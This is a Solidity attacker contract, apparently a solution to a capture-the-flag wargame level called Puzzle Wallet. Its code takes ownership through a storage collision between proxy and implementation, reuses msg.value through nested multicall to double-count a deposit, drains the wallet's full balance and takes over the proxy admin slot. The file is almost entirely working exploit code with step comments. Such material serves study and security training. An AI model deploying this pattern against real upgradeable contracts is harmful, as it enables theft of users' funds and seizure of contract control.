// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PuzzleWallet.sol";

/**
 * @title PuzzleWalletAttacker
 * @dev Exploits storage collision between proxy and implementation
 *
 * Storage layout collision:
 * - PuzzleProxy slot 0: pendingAdmin  <->  PuzzleWallet slot 0: owner
 * - PuzzleProxy slot 1: admin         <->  PuzzleWallet slot 1: maxBalance
 */
contract PuzzleWalletAttacker {
    PuzzleProxy public proxy;
    PuzzleWallet public wallet;

    constructor(address _proxyAddress) {
        proxy = PuzzleProxy(payable(_proxyAddress));
        wallet = PuzzleWallet(_proxyAddress);
    }

    function attack() external payable {
        // Step 1: Become owner via storage collision
        // proposeNewAdmin writes to slot 0 (pendingAdmin)
        // But wallet sees slot 0 as 'owner'
        proxy.proposeNewAdmin(address(this));
        require(wallet.owner() == address(this), "Failed to become owner");

        // Step 2: Whitelist ourselves
        wallet.addToWhitelist(address(this));
        require(wallet.whitelisted(address(this)), "Failed to whitelist");

        // Step 3: Drain contract using multicall vulnerability
        // We exploit nested multicall to bypass deposit-once check
        uint256 contractBalance = address(proxy).balance;
        require(msg.value == contractBalance, "Send exact contract balance");

        // Build nested multicall: [deposit, multicall([deposit])]
        bytes[] memory depositCall = new bytes[](1);
        depositCall[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory outerCalls = new bytes[](2);
        outerCalls[0] = abi.encodeWithSelector(wallet.deposit.selector);
        outerCalls[1] = abi.encodeWithSelector(wallet.multicall.selector, depositCall);

        // This records 2x msg.value in our balance, but only sends 1x
        wallet.multicall{value: msg.value}(outerCalls);

        // Withdraw everything (2x the amount we sent)
        wallet.execute(msg.sender, contractBalance * 2, "");
        require(address(proxy).balance == 0, "Failed to drain");

        // Step 4: Become admin via storage collision
        // setMaxBalance writes to slot 1 (maxBalance)
        // But proxy sees slot 1 as 'admin'
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
        require(proxy.admin() == msg.sender, "Failed to become admin");
    }

    receive() external payable {}
}
